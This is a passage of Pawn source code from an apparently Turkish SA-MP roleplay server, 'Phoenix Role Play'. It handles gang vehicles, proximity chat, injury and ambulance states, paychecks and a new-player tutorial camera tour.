		//printf("Created the gang vehicle for family %d | vehicleid #%d | familyvehicleslot #%d.", f, FamilyVehicleInfo[f][fv][fvId], fv);
		return carcreated;
	}
	return INVALID_VEHICLE_ID;
}

stock DestroyGangVehicle(f, fv)
{
	if(FamilyVehicleInfo[f][fv][fvId] != INVALID_VEHICLE_ID)
	{
		DestroyVehicle(FamilyVehicleInfo[f][fv][fvId]);
		VehicleRadioStation[FamilyVehicleInfo[f][fv][fvId]] = 0;
		FamilyVehicleInfo[f][fv][fvModelId] = 0;
		FamilyVehicleInfo[f][fv][fvSpawnx] = 0.0;
		FamilyVehicleInfo[f][fv][fvSpawny] = 0.0;
		FamilyVehicleInfo[f][fv][fvSpawnz] = 0.0;
		FamilyVehicleInfo[f][fv][fvSpawna] = 0.0;
		FamilyVehicleInfo[f][fv][fvPaintJob] = -1;
		FamilyVehicleInfo[f][fv][fvColor1] = 126;
		FamilyVehicleInfo[f][fv][fvColor2] = 126;
		FamilyVehicleInfo[f][fv][fvPrice] = 0;
		FamilyVehicleInfo[f][fv][fvImpounded] = 0;
		FamilyVehicleInfo[f][fv][fvFuel] = 100.0;
		LockStatus[FamilyVehicleInfo[f][fv][fvId]] = 0;
		//VehicleFuel[FamilyVehicleInfo[f][fv][fvId]] = 100.0;
	    //printf("Family %d vehicle %d(vehicleid %d) has been destroyed.", f,fv,FamilyVehicleInfo[f][fv][fvId]);
	    FamilyVehicleInfo[f][fv][fvId] = INVALID_VEHICLE_ID;
	}
}

stock LoadGangVehicles(f)
{
	//printf(" Loading family %d's vehicles.", f);
	for(new fv = 0; fv < MAX_GANG_VEHICLES; fv++)
    {
        if(FamilyVehicleInfo[f][fv][fvModelId] != 0)
        {
			new carcreated = CreateVehicle(FamilyVehicleInfo[f][fv][fvModelId], FamilyVehicleInfo[f][fv][fvSpawnx], FamilyVehicleInfo[f][fv][fvSpawny], FamilyVehicleInfo[f][fv][fvSpawnz], FamilyVehicleInfo[f][fv][fvSpawna],FamilyVehicleInfo[f][fv][fvColor1], FamilyVehicleInfo[f][fv][fvColor2], -1);
			FamilyVehicleInfo[f][fv][fvId] = carcreated;
			//VehicleFuel[carcreated] = FamilyVehicleInfo[f][fv][fvFuel];
			//if(VehicleFuel[carcreated] == 0) VehicleFuel[carcreated] = 100.0;
			if(FamilyVehicleInfo[f][fv][fvLocked] == 1) LockGangVehicle(f, FamilyVehicleInfo[f][fv][fvId], FamilyVehicleInfo[f][fv][fvLock]);
        }
    }
}

stock UnloadGangVehicles(f)
{
	//printf(" Unloading %s's vehicles.", FamilyInfo[f][FamilyName]);
	for(new fv = 0; fv < MAX_PLAYERVEHICLES; fv++)
    {
        if(FamilyVehicleInfo[f][fv][fvId] != INVALID_VEHICLE_ID)
        {
            if(LockStatus[FamilyVehicleInfo[f][fv][fvId]] != 0) LockStatus[FamilyVehicleInfo[f][fv][fvId]] = 0;
			DestroyVehicle(FamilyVehicleInfo[f][fv][fvId]);
			VehicleRadioStation[FamilyVehicleInfo[f][fv][fvId]] = 0;
			//VehicleFuel[FamilyVehicleInfo[f][fv][fvId]] = 100.0;
			FamilyVehicleInfo[f][fv][fvId] = INVALID_VEHICLE_ID;
        }
    }
}

stock UpdateGangVehicleParkPosition(f, fv, Float:newx, Float:newy, Float:newz, Float:newangle, Float:health, temp = 1)
{
	if(FamilyVehicleInfo[f][fv][fvId] != INVALID_VEHICLE_ID)
	{
	    if(temp == 0)
		{
	 		new Float:oldx, Float:oldy, Float:oldz;
			oldx = FamilyVehicleInfo[f][fv][fvSpawnx];
			oldy = FamilyVehicleInfo[f][fv][fvSpawny];
			oldz = FamilyVehicleInfo[f][fv][fvSpawnz];
			if(oldx == newx && oldy == newy && oldz == newz) return 0;
			FamilyVehicleInfo[f][fv][fvSpawnx] = newx;
			FamilyVehicleInfo[f][fv][fvSpawny] = newy;
			FamilyVehicleInfo[f][fv][fvSpawnz] = newz;
			FamilyVehicleInfo[f][fv][fvSpawna] = newangle;
			DestroyVehicle(FamilyVehicleInfo[f][fv][fvId]);
			new carcreated = CreateVehicle(FamilyVehicleInfo[f][fv][fvModelId], FamilyVehicleInfo[f][fv][fvSpawnx], FamilyVehicleInfo[f][fv][fvSpawny], FamilyVehicleInfo[f][fv][fvSpawnz],
			FamilyVehicleInfo[f][fv][fvSpawna],FamilyVehicleInfo[f][fv][fvColor1], FamilyVehicleInfo[f][fv][fvColor2], -1);
	        FamilyVehicleInfo[f][fv][fvId] = carcreated;
	        SetVehicleHealth(carcreated, health);
	        SaveFamiliesHQ();
        	return 1;
		}
		else
		{
		    new Float:oldx, Float:oldy, Float:oldz;
			oldx = FamilyVehicleInfo[f][fv][fvSpawnxtmp];
			oldy = FamilyVehicleInfo[f][fv][fvSpawnytmp];
			oldz = FamilyVehicleInfo[f][fv][fvSpawnztmp];
			if(oldx == newx && oldy == newy && oldz == newz) return 0;
			FamilyVehicleInfo[f][fv][fvSpawnxtmp] = newx;
			FamilyVehicleInfo[f][fv][fvSpawnytmp] = newy;
			FamilyVehicleInfo[f][fv][fvSpawnztmp] = newz;
			FamilyVehicleInfo[f][fv][fvSpawnatmp] = newangle;
			DestroyVehicle(FamilyVehicleInfo[f][fv][fvId]);
			new carcreated = CreateVehicle(FamilyVehicleInfo[f][fv][fvModelId], FamilyVehicleInfo[f][fv][fvSpawnxtmp], FamilyVehicleInfo[f][fv][fvSpawnytmp], FamilyVehicleInfo[f][fv][fvSpawnztmp],
			FamilyVehicleInfo[f][fv][fvSpawnatmp],FamilyVehicleInfo[f][fv][fvColor1], FamilyVehicleInfo[f][fv][fvColor2], -1);
	        FamilyVehicleInfo[f][fv][fvId] = carcreated;
	        SetVehicleHealth(carcreated, health);
	        SaveFamiliesHQ();
        	return 1;
		}
	}
	return 0;
}

stock GetGangFreeVehicleId(f)
{
    new
		i = 0;
	while (i < MAX_GANG_VEHICLES && FamilyVehicleInfo[f][i][fvId] != INVALID_VEHICLE_ID)
	{
		i++;
	}
	if(i == MAX_GANG_VEHICLES) return -1;
	return i;

}

stock GetGangVehicleCount(f)
{
    new
		i = 0,
		cars = 0;
	while (i < MAX_GANG_VEHICLES && FamilyVehicleInfo[f][i][fvId] != INVALID_VEHICLE_ID)
	{
	    cars++;
		i++;
	}
	return cars;

}

stock GetGangVehicle(f, vehicleid)
{
	if(f == 255) return -1;
	if(vehicleid == -1) return -1;
    for(new v = 0; v < MAX_GANG_VEHICLES; v++)
    {
        if(FamilyVehicleInfo[f][v][fvId] == vehicleid)
        {
            return v;
        }
    }
    return -1;
}

ProxDetector(Float: f_Radius, playerid, string[],col1,col2,col3,col4,col5)
{
    new
        Float: f_playerPos[3];

    GetPlayerPos(playerid, f_playerPos[0], f_playerPos[1], f_playerPos[2]);

    foreach(Player, i) {
        if((InsideShamal[playerid] == GetPlayerVehicleID(i) && GetPlayerState(i) == 2) || (InsideShamal[i] == GetPlayerVehicleID(playerid) && GetPlayerState(playerid) == 2) || (InsideShamal[playerid] != INVALID_VEHICLE_ID && InsideShamal[playerid] == InsideShamal[i])) {
            SendClientMessage(i, col1, string);
        }
        else if(GetPlayerVirtualWorld(i) == GetPlayerVirtualWorld(playerid)) {
            if(IsPlayerInRangeOfPoint(i, f_Radius / 16, f_playerPos[0], f_playerPos[1], f_playerPos[2])) {
                SendClientMessage(i, col1, string);
            }
            else if(IsPlayerInRangeOfPoint(i, f_Radius / 8, f_playerPos[0], f_playerPos[1], f_playerPos[2])) {
                SendClientMessage(i, col2, string);
            }
            else if(IsPlayerInRangeOfPoint(i, f_Radius / 4, f_playerPos[0], f_playerPos[1], f_playerPos[2])) {
                SendClientMessage(i, col3, string);
            }
            else if(IsPlayerInRangeOfPoint(i, f_Radius / 2, f_playerPos[0], f_playerPos[1], f_playerPos[2])) {
                SendClientMessage(i, col4, string);
            }
            else if(IsPlayerInRangeOfPoint(i, f_Radius, f_playerPos[0], f_playerPos[1], f_playerPos[2])) {
                SendClientMessage(i, col5, string);
            }
        }
    }
    return 1;
}

ProxDetectorS(Float:radi, playerid, targetid) {

	if(Spectating[targetid] != 0 && PlayerInfo[playerid][pAdmin] < 2)
 	{
 		return 0;
 	}

	new
		Float: fp_playerPos[3];

	GetPlayerPos(targetid, fp_playerPos[0], fp_playerPos[1], fp_playerPos[2]);

	if(IsPlayerInRangeOfPoint(playerid, radi, fp_playerPos[0], fp_playerPos[1], fp_playerPos[2]) && GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(targetid))
	{
		return 1;
	}
	return 0;
}

IsPlayerInRangeOfVehicle(playerid, vehicleid, Float: radius) {

	new
		Float:Floats[3];

	GetVehiclePos(vehicleid, Floats[0], Floats[1], Floats[2]);
	return IsPlayerInRangeOfPoint(playerid, radius, Floats[0], Floats[1], Floats[2]);
}

forward MoveEMS(playerid);
public MoveEMS(playerid)
{
    new Float:mX, Float:mY, Float:mZ;
    GetPlayerPos(playerid, mX, mY, mZ);

    SetPVarFloat(GetPVarInt(playerid, "MovingStretcher"), "MedicX", mX);
	SetPVarFloat(GetPVarInt(playerid, "MovingStretcher"), "MedicY", mY);
	SetPVarFloat(GetPVarInt(playerid, "MovingStretcher"), "MedicZ", mZ);
	SetPVarInt(GetPVarInt(playerid, "MovingStretcher"), "MedicVW", GetPlayerVirtualWorld(playerid));
	SetPVarInt(GetPVarInt(playerid, "MovingStretcher"), "MedicInt", GetPlayerInterior(playerid));

	Streamer_UpdateEx(GetPVarInt(playerid, "MovingStretcher"), mX, mY, mZ);
	SetPlayerPos(GetPVarInt(playerid, "MovingStretcher"), mX, mY, mZ);
	SetPlayerInterior(GetPVarInt(playerid, "MovingStretcher"), GetPlayerVirtualWorld(playerid));
	SetPlayerVirtualWorld(GetPVarInt(playerid, "MovingStretcher"), GetPlayerVirtualWorld(playerid));

	ClearAnimations(GetPVarInt(playerid, "MovingStretcher"), 1);
	ApplyAnimation(GetPVarInt(playerid, "MovingStretcher"), "SWAT", "gnstwall_injurd", 4.0, 0, 1, 1, 1, 0, 1);

	DeletePVar(GetPVarInt(playerid, "MovingStretcher"), "OnStretcher");
	SetPVarInt(playerid, "MovingStretcher", -1);
}

forward KillEMSQueue(playerid);
public KillEMSQueue(playerid)
{
	if(IsPlayerConnected(GetPVarInt(playerid, "EMSWaiting")) && EMSAccepted[GetPVarInt(playerid, "EMSWaiting")] == playerid) {
		new
			string[126];
		format(string, sizeof(string), "Hastan %, sen onu yetiþtiremeden öldü.!",GetPlayerNameEx(playerid));
		SendClientMessage(GetPVarInt(playerid, "EMSWaiting"), COLOR_LIGHTBLUE, string);
		DisablePlayerCheckpoint(GetPVarInt(playerid, "EMSWaiting"));
		EMSCallTime[GetPVarInt(playerid, "EMSWaiting")] = 0;
		EMSAccepted[GetPVarInt(playerid, "EMSWaiting")] = INVALID_PLAYER_ID;
	}
    DeletePVar(playerid, "Injured");
    DeletePVar(playerid, "EMSAttempt");
    DeletePVar(playerid, "EMSWaiting");
	SetPVarInt(playerid, "DoktorMasrafi", 1);
	DeletePVar(playerid, "MedicCall");

	return 1;
}

forward SendEMSQueue(playerid,type);
public SendEMSQueue(playerid,type)
{
	switch (type)
	{
		case 1:
		{
		    Streamer_UpdateEx(playerid, GetPVarFloat(playerid,"MedicX"), GetPVarFloat(playerid,"MedicY"), GetPVarFloat(playerid,"MedicZ"));
			SetPlayerPos(playerid, GetPVarFloat(playerid,"MedicX"), GetPVarFloat(playerid,"MedicY"), GetPVarFloat(playerid,"MedicZ"));
			SetPlayerVirtualWorld(playerid, GetPVarInt(playerid,"MedicVW"));
	  		SetPlayerInterior(playerid, GetPVarInt(playerid,"MedicInt"));

			SetPVarInt(playerid, "EMSAttempt", -1);

			if(GetPlayerInterior(playerid) > 0)
			{
  				LoadObjectsForPlayer(playerid);
			}

			GameTextForPlayer(playerid, "~r~Yaralisin~n~~w~/kabulet olum yada /cagir ambulans", 5000, 3);
			ClearAnimations(playerid, 1);
			PreloadAnimLib(playerid,"KNIFE");
			ApplyAnimation(playerid, "KNIFE", "KILL_Knife_Ped_Die", 4.0, 0, 1, 1, 1, 0, 1);
			SetPlayerHealth(playerid, 100);
			SetPlayerArmourEx(playerid,0);
			if(GetPVarInt(playerid, "usingfirstaid") == 1)
			    firstaidexpire(playerid);

			SetPVarInt(playerid,"MedicCall",1);
		}
		case 2:
		{
		    SetPVarInt(playerid,"EMSAttempt", 2);
			ClearAnimations(playerid, 1);
		 	ApplyAnimation(playerid, "SWAT", "gnstwall_injurd", 4.0, 0, 1, 1, 1, 0, 1);
			SetPlayerHealth(playerid, 100);
			SetPlayerArmourEx(playerid,0);
		}
	}
	return 1;
}

stock AddAutomatedFlag(playerid, reason[]) {
	new month,day,year;
	getdate(year,month,day);
 	if(!strlen(PlayerInfo[playerid][pFlag]))
	 	format(PlayerInfo[playerid][pFlag],128,"%s - Server (%d/%d/%d)",reason, day, month, year);

	return 1;
}

stock AddFlag(playerid,adminid,reason[])
{
	new month,day,year;
	getdate(year,month,day);
	new playername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, playername, sizeof(playername));
 	format(PlayerInfo[playerid][pFlag],128,"%s - %s (%d/%d/%d)",reason,GetPlayerNameEx(adminid), day, month, year);
}

forward AddReportToken(playerid);
public AddReportToken(playerid)
{
	new
		sz_FileStr[32 + MAX_PLAYER_NAME],
		sz_playerName[MAX_PLAYER_NAME],
		i_timestamp[3],
		File: fPointer;

	GetPlayerName(playerid, sz_playerName, MAX_PLAYER_NAME);
	getdate(i_timestamp[0], i_timestamp[1], i_timestamp[2]);

	format(sz_FileStr, sizeof(sz_FileStr), "admins/rtokens/%s[%d'%d'%d]", sz_playerName, i_timestamp[1], i_timestamp[2], i_timestamp[0]);
	if(fexist(sz_FileStr))
	{
		fPointer = fopen(sz_FileStr, io_read);
		fread(fPointer, sz_playerName);
		fclose(fPointer);

		new
			i_tokenVal = strval(sz_playerName);

		format(sz_playerName, sizeof(sz_playerName), "%i", i_tokenVal + 1);
		fPointer = fopen(sz_FileStr, io_write);
		fwrite(fPointer, sz_playerName);
		fclose(fPointer);
	}
	else {
		fPointer = fopen(sz_FileStr, io_write);
		fwrite(fPointer, "1");
		fclose(fPointer);
	}
	return 1;
}

forward SeeReportToken(playerid,name[],month,day,year);
public SeeReportToken(playerid,name[],month,day,year)
{
	new string[128], rtoken;
	new strFromFile[128];
	format(string,sizeof(string),"admins/rtokens/%s[%d'%d'%d]",name,month,day,year);
	if(fexist(string))
	{
		new File: file = fopen(string, io_read);
		fread(file, strFromFile);
		fclose(file);

		rtoken = strval(strFromFile);
		format(string,sizeof(string),"Adminin %d rapor jetonu var. Tarih: [%d/%d/%d].",rtoken,month,day,year);
		SendClientMessage(playerid, COLOR_YELLOW, string);
	}
	else
	{
		SendClientMessage(playerid, COLOR_YELLOW, "Adminin bu tarihe dair girilmiþ rapor jetonu bulunmamaktadýr.");
		return 0;
	}
	return 1;
}

forward firstaid5(playerid);
public firstaid5(playerid)
{
	if(GetPVarInt(playerid, "usingfirstaid") == 1)
 	{
		new Float:health;
		GetPlayerHealth(playerid, health);
		if(health < 100.0)
		{
		    if((health+5.0) <= 100.0)
		    {
 				SetPlayerHealth(playerid, health+5.0);
			}
		}
	}
}

forward firstaidexpire(playerid);
public firstaidexpire(playerid)
{
	SendClientMessage(playerid, COLOR_GRAD1, "Ýlk yardým kitinin süresi bitti.");
 	KillTimer(GetPVarInt(playerid, "firstaid5"));
  	SetPVarInt(playerid, "usingfirstaid", 0);
}

stock GetClosestPlayer(p1)
{
	new Float:dis,Float:dis2,player;
	player = -1;
	dis = 99999.99;
	foreach(Player, x)
	{
			if(x != p1)
			{
				dis2 = GetDistanceBetweenPlayers(x,p1);
				if(dis2 < dis && dis2 != -1.00)
				{
					dis = dis2;
					player = x;
				}
			}
	}
	return player;
}

forward rccam(playerid);
public rccam(playerid)
{
	DestroyVehicle(GetPVarInt(playerid, "rcveh"));
	VehicleRadioStation[GetPVarInt(playerid, "rcveh")] = 0;
 	SetPlayerPos(playerid, GetPVarFloat(playerid, "rcX"), GetPVarFloat(playerid, "rcY"), GetPVarFloat(playerid, "rcZ"));
  	SendClientMessage(playerid, COLOR_GRAD1, "Yerleþtirilebilir kameranýn bateryasý bitti.");
   	SetPVarInt(playerid, "rccam", 0);
}

forward SyncTime();
public SyncTime()
{
	new
		string[64],
		tmphour,
		tmpminute,
		tmpsecond;

	gettime(tmphour, tmpminute, tmpsecond);
	FixHour(tmphour);
	tmphour = shifthour;
	if((tmphour > ghour) || (tmphour == 0 && ghour == 23))
	{
		format(string, sizeof(string), "Þuanda saat %d:00.",tmphour);
		SendClientMessageToAllEx(COLOR_WHITE,string);
		ghour = tmphour;
		TotalUptime += 1;
		SetWorldTime(tmphour);
		PayDay();

		SaveFamilies();
	}
}


PayDay()
{
	new
		string[128];

 	foreach(Player, i) {
		if(PlayerInfo[i][pLevel] > 0) {
			if(PlayerInfo[i][pPayReady] >= 6) {
				new code = Random(100000, 999999);
				PayCheckCode[i] = code;
				SendClientMessage(i, COLOR_GREY,"_______________________________________________________________");
				SendClientMessage(i, COLOR_WHITE,"Maaþ hakkýnda bilgi için: {33CCFF}/maasyardim {FFFFFF}or {33CCFF}/vergiyardim");
				SendClientMessage(i, COLOR_GREY,"_______________________________________________________________");
				SendClientMessage(i, COLOR_WHITE,"Maaþýný alabilmek için maaþ kodunu gir.");
				SendClientMessage(i, COLOR_LIGHTBLUE, "/maas yazin");
				SendClientMessage(i, COLOR_WHITE,"Maaþ kodunun süresi bitmeden maaþýný alabilmen için 5 dakikan var.");
				SendClientMessage(i, COLOR_GREY,"_______________________________________________________________");
				GameTextForPlayer(i, "~w~/maas yazin", 2500, 1);
				if(MP3Station[i] == 0 && BoomBoxSet[i] == 0) {
					PlayerPlaySound(i,SOUND_MUSIC1,2050.1995, 1344.5500, 13.2378);
					PayMusic(i);
			}
				WasHereForPaycheck[i] = 1;
				SetTimer("LastAlertPayCheck", 240000, false);
			} else SendClientMessage(i, COLOR_LIGHTRED, "Maaþýný alabilmek için yeterince oyunda kalmadýn.");

			if(GetPVarType(i, "debtMsg")) {
				if(PlayerInfo[i][pJailed] < 1 && !IsACop(i) && PlayerInfo[i][pWantedLevel] < 6) {
					format(string,sizeof(string),"Devlete olan $%d borcunu ödemedin. Polis seni arýyor.",GetPlayerCash(i));
					SendClientMessage(i, COLOR_LIGHTRED, string);
					PlayerInfo[i][pCrimes]++;
					SetPlayerWantedLevel(i, ++PlayerInfo[i][pWantedLevel]);
				}
			}
			if(PlayerInfo[i][pRenting] != INVALID_HOUSE_ID) {
				if(HouseInfo[PlayerInfo[i][pRenting]][hRentFee] > PlayerInfo[i][pBank]) {
					PlayerInfo[i][pRenting] = INVALID_HOUSE_ID;
					SendClientMessage(i, COLOR_WHITE, "Kira ücretini ödemediðin için kiracýlýktan çýkarýldýn.");
				} else {
					HouseInfo[PlayerInfo[i][pRenting]][hSafeMoney] += HouseInfo[PlayerInfo[i][pRenting]][hRentFee];
					PlayerInfo[i][pBank] -= HouseInfo[PlayerInfo[i][pRenting]][hRentFee];
				}
			}
		}
	}
	Misc_Save();
	return 1;
}

forward LastAlertPayCheck();
public LastAlertPayCheck()
{
    foreach(Player, i)
    {
        if(WasHereForPaycheck[i] == 1 && SignedPaycheck[i] == 0)
        {
            if(GetPVarInt(i, "LAPCReceived") != 1)
            {
            	GameTextForPlayer(i, "~w~/maas yazin", 2500, 1);
            	SendClientMessage(i, COLOR_WHITE, "Maas kodunuzun süresinin sona ermesi için son 1 dakikan kaldi. Maaþýný almak için /maas yazmalýsýn.");
            	SetPVarInt(i, "LAPCReceived", 1);
			}
        }
    }
	SetTimer("DestroyChecks", 60000, false);
}

forward DestroyChecks();
public DestroyChecks()
{
    foreach(Player, i)
    {
        PayCheckCode[i] = 0;

        if(WasHereForPaycheck[i] == 1 && SignedPaycheck[i] == 0)
        {
            SendClientMessage(i, COLOR_WHITE, "Maas kodunuzun süresi bitti. Bir dahaki sefere /maas yazmayý unutmayýn");

			if(AdminDuty[i] == 0)
			{
            	MissedPaychecks[i]++;
			}

            if(MissedPaychecks[i] >= 2 && AdminDuty[i] == 0)
            {
                new string[128];
          		format(string, sizeof(string), "{AA3333}AdminUyarý{FFFF00}: %s adlý oyuncu üst üste 2 defa maaþ almadýðý için otomatik olarak kicklendi.", GetPlayerNameEx(i));
				ABroadCast(COLOR_YELLOW, string, 1);
                format(string, sizeof(string), "AdminUyarý: %s adlý oyuncu üst üste 2 defa maaþ almadýðý için otomatik olarak kicklendi.", GetPlayerNameEx(i));
                Log("logs/payfarming.log", string);
                Kick(i);
            }
        }

        WasHereForPaycheck[i] = 0;
        SignedPaycheck[i] = 0;
        DeletePVar(i, "LAPCReceived");
    }
}

forward TutorialProgression(playerid);
public TutorialProgression(playerid)
{
	Streamer_Update(playerid);

	if(TutorialProgress[playerid] == 1)
	{
		SetPlayerPos(playerid, 2224.411865, -2649.862060, -30.544359);
		SetPlayerCameraPos(playerid, 2268.519531, -2611.522460, 31.097387);
		SetPlayerCameraLookAt(playerid, 2224.411865, -2649.862060, 13.407735);
		TogglePlayerControllable(playerid,0);

		for(new t = 6; t < 11; t++)
		{
			TextDrawHideForPlayer(playerid, TutTxtDraw[t]);
		}
		for(new t = 11; t < 15; t++)
		{
			TextDrawShowForPlayer(playerid, TutTxtDraw[t]);
		}

        TutorialProgress[playerid] = 2;

		SetTimerEx("TutorialProgression", 0, 0, "d", playerid);
	}
	else if(TutorialProgress[playerid] == 2)
	{
		SetPlayerPos(playerid, 1466.24, -1023.05, -80.0);
		SetPlayerCameraPos(playerid, 1502.28, -1044.47, 31.19);
		SetPlayerCameraLookAt(playerid, 1466.24, -1023.05, 23.83);
		TogglePlayerControllable(playerid,0);

		TextDrawShowForPlayer(playerid, TutTxtDraw[15]);

		TutorialProgress[playerid] = 3;

		SetTimerEx("TutorialProgression", 0, 0, "d", playerid);

	}
	else if(TutorialProgress[playerid] == 3)
	{
		SetPlayerPos(playerid, 1504.23, -1700.17, -80.0);
		SetPlayerCameraPos(playerid, 1500.21, -1691.75, 38.38);
		SetPlayerCameraLookAt(playerid, 1541.46, -1676.17, 13.55);
		TogglePlayerControllable(playerid,0);

		for(new t = 11; t < 16; t++)
		{
			TextDrawHideForPlayer(playerid, TutTxtDraw[t]);
		}
		for(new t = 16; t < 22; t++)
		{
			TextDrawShowForPlayer(playerid, TutTxtDraw[t]);
		}

		TutorialProgress[playerid] = 4;

		SetTimerEx("TutorialProgression", 0, 0, "d", playerid);
	}
	else if(TutorialProgress[playerid] == 4)
	{
		SetPlayerPos(playerid, 1201.12, -1324, -80.0);
		SetPlayerCameraPos(playerid, 1207.39, -1294.71, 24.61);
		SetPlayerCameraLookAt(playerid, 1181.72, -1322.65, 13.58);
		TogglePlayerControllable(playerid,0);

		for(new t = 16; t < 22; t++)
		{
			TextDrawHideForPlayer(playerid, TutTxtDraw[t]);
		}
		for(new t = 22; t < 27; t++)
		{
			TextDrawShowForPlayer(playerid, TutTxtDraw[t]);
		}

		TutorialProgress[playerid] = 5;

		SetTimerEx("TutorialProgression", 0, 0, "d", playerid);
	}
	else if(TutorialProgress[playerid] == 5)
	{
		SetPlayerPos(playerid, 2489.09, -1669.88, -80.0);
		SetPlayerCameraPos(playerid, 2459.82, -1652.68, 26.45);
		SetPlayerCameraLookAt(playerid, 2489.09, -1669.88, 13.34);
		TogglePlayerControllable(playerid,0);

		for(new t = 22; t < 27; t++)
		{
			TextDrawHideForPlayer(playerid, TutTxtDraw[t]);
		}
		for(new t = 27; t < 32; t++)
		{
			TextDrawShowForPlayer(playerid, TutTxtDraw[t]);
		}

		TutorialProgress[playerid] = 6;

		SetTimerEx("TutorialProgression", 0, 0, "d", playerid);
	}
	else if(TutorialProgress[playerid] == 6)
	{
		SetPlayerPos(playerid, 2172.315185, -2263.781250, -60.0);
		SetPlayerCameraPos(playerid, 2206.363769, -2262.568359, 24.240808);
		SetPlayerCameraLookAt(playerid, 2172.315185, -2263.781250, 13.335824);
		TogglePlayerControllable(playerid,0);

		for(new t = 27; t < 32; t++)
		{
			TextDrawHideForPlayer(playerid, TutTxtDraw[t]);
		}
		for(new t = 32; t < 37; t++)
		{
			TextDrawShowForPlayer(playerid, TutTxtDraw[t]);
		}

		TutorialProgress[playerid] = 7;

		SetTimerEx("TutorialProgression", 0, 0, "d", playerid);
	}
	else if(TutorialProgress[playerid] == 7)
	{
		SetPlayerPos(playerid, 2351.542724, -1169.992797, -22.303030);
		SetPlayerCameraPos(playerid, 2335.889404, -1148.501586, 34.610519);
		SetPlayerCameraLookAt(playerid, 2351.542724, -1169.992797, 28.041967);
		TogglePlayerControllable(playerid,0);

		for(new t = 32; t < 37; t++)
		{
			TextDrawHideForPlayer(playerid, TutTxtDraw[t]);
		}
		for(new t = 37; t < 42; t++)
		{
			TextDrawShowForPlayer(playerid, TutTxtDraw[t]);
		}

		TutorialProgress[playerid] = 8;

		SetTimerEx("TutorialProgression", 0, 0, "d", playerid);
	}
	else if(TutorialProgress[playerid] == 8)
	{
		SetPlayerPos(playerid, 2128.194091, -1132.911865, -14.425248);
		SetPlayerCameraPos(playerid, 2116.651123, -1103.233642, 37.885963);
		SetPlayerCameraLookAt(playerid, 2128.194091, -1132.911865, 25.567047);
		TogglePlayerControllable(playerid,0);

		for(new t = 37; t < 42; t++)
		{
			TextDrawHideForPlayer(playerid, TutTxtDraw[t]);
		}
		for(new t = 42; t < 46; t++)
		{
			TextDrawShowForPlayer(playerid, TutTxtDraw[t]);
		}

		TutorialProgress[playerid] = 9;

		SetTimerEx("TutorialProgression", 0, 0, "d", playerid);
	}
	else if(TutorialProgress[playerid] == 9)
	{
		SetPlayerPos(playerid, 2523.063232, -1679.484375, -17.811601);
		SetPlayerCameraPos(playerid, 2508.055908, -1676.983154, 18.012311);
		SetPlayerCameraLookAt(playerid, 2523.063232, -1679.484375, 15.496999);
		TogglePlayerControllable(playerid,0);

		TextDrawShowForPlayer(playerid, TutTxtDraw[46]);
		TextDrawShowForPlayer(playerid, TutTxtDraw[47]);

		TutorialProgress[playerid] = 10;

		SetTimerEx("TutorialProgression", 0, 0, "d", playerid);
	}
	else if(TutorialProgress[playerid] == 10)
	{
		SetPlayerPos(playerid, 1315.601806, -898.753417, -4.157680);
		SetPlayerCameraPos(playerid, 1315.780151, -927.116638, 48.019481);
		SetPlayerCameraLookAt(playerid, 1315.601806, -898.753417, 39.578125);
		TogglePlayerControllable(playerid,0);

		for(new t = 42; t < 48; t++)
		{
			TextDrawHideForPlayer(playerid, TutTxtDraw[t]);
		}
		TextDrawShowForPlayer(playerid, TutTxtDraw[48]);
		TextDrawShowForPlayer(playerid, TutTxtDraw[49]);

		TutorialProgress[playerid] = 11;

		SetTimerEx("TutorialProgression", 0, 0, "d", playerid);
	}
	else if(TutorialProgress[playerid] == 11)
	{
		SetPlayerPos(playerid, 2243.374023, -1664.780517, -38.467826);
		SetPlayerCameraPos(playerid, 2239.001953, -1645.624145, 22.123142);
		SetPlayerCameraLookAt(playerid, 2243.374023, -1664.780517, 15.476562);
		TogglePlayerControllable(playerid,0);

		TextDrawShowForPlayer(playerid, TutTxtDraw[50]);
		TextDrawShowForPlayer(playerid, TutTxtDraw[51]);

		TutorialProgress[playerid] = 12;

		SetTimerEx("TutorialProgression", 0, 0, "d", playerid);
	}
	else if(TutorialProgress[playerid] == 12)
	{
		SetPlayerPos(playerid, 1970.506103, -1201.447143, -25.074676);
    	SetPlayerCameraPos(playerid, 2022.083740, -1308.260620, 80.478797);
    	SetPlayerCameraLookAt(playerid, 1970.506103, -1201.447143, 25.596593);
		TogglePlayerControllable(playerid,0);

		TextDrawShowForPlayer(playerid, TutTxtDraw[52]);
		TextDrawShowForPlayer(playerid, TutTxtDraw[53]);

		TutorialProgress[playerid] = 13;

		SetTimerEx("TutorialProgression", 0, 0, "d", playerid);
	}
	else if(TutorialProgress[playerid] == 13)
	{
	    DeletePVar(playerid, "IsFrozen");
		for(new t = 0; t < 54; t++)
		{
			TextDrawHideForPlayer(playerid, TutTxtDraw[t]);
		}

		SetPlayerInterior(playerid, 0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerPos(playerid, 1773.459350, -1942.273437, 13.569922);
		SetPlayerFacingAngle(playerid, 329.64);
		SetCameraBehindPlayer(playerid);

		InsideTut[playerid] = 0;
		DeletePVar(playerid, "DoktorMasrafi");
		SetPlayerColor(playerid,TEAM_HIT_COLOR);
		PlayerInfo[playerid][pTut] = 1;

	    if(PlayerInfo[playerid][pSex] == 1) {
	        PlayerInfo[playerid][pSkin] = 299;
	    } else {
	        PlayerInfo[playerid][pSkin] = 55;
	    }
		SetPlayerSkin(playerid, 26);

		ClearChatbox(playerid);
		PlayerInfo[playerid][pHouse] = INVALID_HOUSE_ID;
		PlayerInfo[playerid][pBiz] = 0;
		PlayerInfo[playerid][pVBiz] = 0;
		PlayerInfo[playerid][pHouse2] = INVALID_HOUSE_ID;
		new string[128];
		format(string, sizeof(string), "Phoenix Role Play'ye hoþgeldiniz, %s.", GetPlayerNameEx(playerid));
		SendClientMessage(playerid, COLOR_CYAN, string);

		format(string, sizeof(string), "~w~Hosgeldiniz~n~~y~%s", GetPlayerNameEx(playerid));
		GameTextForPlayer(playerid, string, 5000, 1);

		SendClientMessage(playerid, COLOR_CYAN, "Sormak istedikleriniz için, /newb komutunu kullanýn. Kurallarý bozan kiþileri görürseniz /rapor ile bildiriniz.");

		new motdstring[128];
		format(motdstring, sizeof(motdstring), "Haberler: %s", GlobalMOTD);
		SendClientMessage(playerid, COLOR_WHITE, motdstring);

        TextDrawShowForPlayer(playerid, site);
		TutorialProgress[playerid] = 0;
		TogglePlayerControllable(playerid, true);
	}
}

